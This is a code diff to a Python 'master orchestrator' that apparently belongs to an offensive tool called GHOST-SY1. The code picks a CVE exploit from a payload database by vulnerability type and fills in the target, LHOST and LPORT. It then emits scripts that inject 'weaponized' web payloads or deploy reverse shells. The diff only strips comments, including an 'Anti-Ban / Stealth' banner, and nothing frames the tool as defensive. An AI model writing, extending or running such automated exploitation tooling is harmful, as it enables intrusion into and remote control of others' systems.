@@ -33,16 +33,9 @@ class MasterOrchestrator:
 
         if target_type == "web":
             url = self.target if self.target.startswith("http") else f"http://{self.target}"
-            # Select web exploit from DB automatically
             web_exploit = next((v for v in self.payload_db if "sql" in v['vulnerability_type'].lower() or "web" in v['description'].lower()), self.payload_db[0])
             
             script = f"""# ==========================================
-# GHOST-SY1 MASTER ORCHESTRATOR - WEB MODE
-# Target URL: {url}
-# Selected CVE: {web_exploit['cve']}
-# Vulnerability: {web_exploit['vulnerability_type']}
-# Anti-Ban / Stealth Active
-# ==========================================
 
 import requests
 import random
@@ -58,7 +51,6 @@ time.sleep(1)
 print("[+] Automatic vulnerability matched: {web_exploit['cve']}")
 print("[+] Injecting weaponized payload automatically...")
 
-# Autonomous Execution Payload:
 {web_exploit['exploit_code'].replace('TARGET', url).replace('LHOST', self.lhost).replace('LPORT', str(self.lport))}
 
 print("[+] Web exploitation sequence completed.")
@@ -66,16 +58,9 @@ print("[+] Web exploitation sequence completed.")
             return {"type": "Web Application", "cve": web_exploit['cve'], "script": script}
         
         else:
-            # Network Mode
             net_exploit = next((v for v in self.payload_db if "overflow" in v['vulnerability_type'].lower() or "remote code" in v['vulnerability_type'].lower()), self.payload_db[1])
             
             script = f"""# ==========================================
-# GHOST-SY1 MASTER ORCHESTRATOR - NETWORK MODE
-# Target IP: {self.target}
-# Selected CVE: {net_exploit['cve']}
-# Vulnerability: {net_exploit['vulnerability_type']}
-# Anti-Ban / Stealth Active
-# ==========================================
 
 import socket
 import time
@@ -90,7 +75,6 @@ time.sleep(1)
 print("[+] Automatic vulnerability matched: {net_exploit['cve']}")
 print("[+] Deploying reverse shell payload to {self.target}...")
 
-# Autonomous Execution Payload:
 {net_exploit['exploit_code'].replace('TARGET', self.target).replace('LHOST', self.lhost).replace('LPORT', str(self.lport))}
 
 print("[+] Network exploitation sequence completed.")
